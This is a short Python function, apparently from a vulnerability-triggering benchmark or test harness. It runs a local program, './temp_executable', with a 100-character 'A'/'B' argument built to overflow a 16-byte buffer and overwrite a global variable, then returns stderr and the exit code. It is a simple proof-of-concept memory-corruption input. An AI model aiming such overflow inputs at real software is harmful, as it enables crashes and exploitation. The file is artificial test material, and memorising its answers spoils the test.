  def execute_program(timeout: int) -> tuple[str, int]:
      import signal
      import subprocess

      # Create a long input string that should cause buffer overflow
      # Buffer p is 16 bytes, so we need more than 16 characters
      # Global variable n could be at various offsets, so use a long string
      # Using a pattern that increases gradually to help identify the offset
      
      # Create a pattern: 16 chars to fill buffer + 84 more to reach likely offset
      # Total 100 characters should be sufficient for most memory layouts
      input_string = "A" * 16  # Fill the 16-byte buffer
      input_string += "B" * 84  # Additional characters to overflow and hit global variable
      
      try:
          # Use proper subprocess call without shell=True for better control
          # The program expects argc == 2 with argv[1] as the input string
          result = subprocess.run(
              ["./temp_executable", input_string],
              capture_output=True,
              encoding="utf-8",
              errors="replace",
              timeout=timeout,
          )
          # Return stderr and the return code
          return result.stderr, result.returncode
      except subprocess.TimeoutExpired as e:
          # Timeout occurred, also ensure to return stderr captured before timeout and return code -signal.SIGKILL
          stderr_text = e.stderr.decode('utf-8', errors='replace') if e.stderr else ""
          return stderr_text, -signal.SIGKILL
      except Exception as e:
          # ensure to raise the error if run failed
          raise e
